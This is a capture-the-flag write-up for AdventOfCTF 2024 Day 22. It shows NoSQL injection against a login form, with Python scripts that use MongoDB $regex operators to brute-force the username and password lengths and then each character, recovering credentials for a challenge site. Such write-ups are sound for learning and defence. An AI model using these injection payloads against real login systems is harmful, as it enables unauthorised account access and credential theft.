---
title: AdventOfCTF 2024 Day 22: K.U.N.A.L. Consulting
draft: false
tags:
  - ctf
---

# Day 22: K.U.N.A.L. Consulting

Determine vulnerable to NoSQL injection using `$ne`. 
Determine length of `username` and `password` fields:

```python
import requests
import string

# Base URL for the login endpoint
BASE_URL = "https://kunal-consulting.csd.lol/login"

# Define the character set for the brute-force attack
characters = string.printable

def determine_length():
    for i in range(1, 100):
        payload = {
            "username": {
                "$regex": f"^.{{{i}}}$"
            },
            "password": {
                "$regex": f".*"
            }
        }
        response = requests.post(BASE_URL, json=payload)
        if "Login successful!" in response.text:
            print(f"Username length: {i}")
            for j in range(1, 100):
                payload = {
                    "username": {
                        "$regex": f"^.{{{i}}}$"
                    },
                    "password": {
                        "$regex": f"^.{{{j}}}$"
                    }
                }
                response = requests.post(BASE_URL, json=payload)
                if "Login successful!" in response.text:
                    print(f"Password length: {j}")
                    return i, j
    return 0, 0
```

This uses the regex `^.{N}$` where `N` is an integer 0-100 and tries to identify the "Login successful!" message to extract the length. With this, we determine length of `username` is seven and length of `password` is 97. 

Figure out `username`:

```python
# Base URL for the login endpoint
BASE_URL = "https://kunal-consulting.csd.lol"

# Define the character set for the brute-force attack
characters = string.printable

# Function to systematically build the username
def brute_force_usernames(length, username):
    charset = string.printable
    
    for c in charset:
        payload = {
            "username": {
                "$regex": f"^{username}{c}.{{{length - 1}}}$"
            },
            "password": {
                "$regex": ".*"
            }
        }
        print(f"Trying username regex: {payload['username']['$regex']}")
        response = requests.post(f"{BASE_URL}/login", json=payload)
        if "Login successful!" in response.text:
            print(f"Found username character: {c}")
            return c
        # else:
        #     print(f"Username character {c} not found")

username = ""
username_length = 7 - len(username)
# Do it this way in case we get timed out, we can continue from where we left off

while username_length > 0:
    username += brute_force_usernames(username_length, username)
    username_length -= 1

print(username)
```

And then figure out `password`:

```python
# Function to systematically build the password
def brute_force_passwords(length, password, username):
    charset = string.printable - "."
    
    for c in charset:
        payload = {
            "username": {
                "$regex": f"{username}"
            },
            "password": {
                "$regex": f"^{password}{c}.{{{length - 1}}}$"
            }
        }
        print(f"Trying username {username} and password regex: {payload['password']['$regex']}")
        response = requests.post(f"{BASE_URL}/login", json=payload)
        print(response.text)
        if "Login successful!" in response.text:
            print(f"Found password character: {c}")
            return c
        # else:
        #     print(f"Username character {c} not found")

password = ""
password_length = 97 - len(password)

while password_length > 0:
    try:
        password += brute_force_passwords(password_length, password, username)
        password_length -= 1
    except Exception as e:
        continue # try again
    
# the periods are artifacts from the regex.. turns out it's underscores
password = password.replace(".", "_")
```

This gets us `XhaNy22:reasons_i_use_a_really_long_password_1_security_2_to_practice_my_typing_skills_3_to_mess_with_you`. 

Lastly, login to the `/employee-login` to get the flag!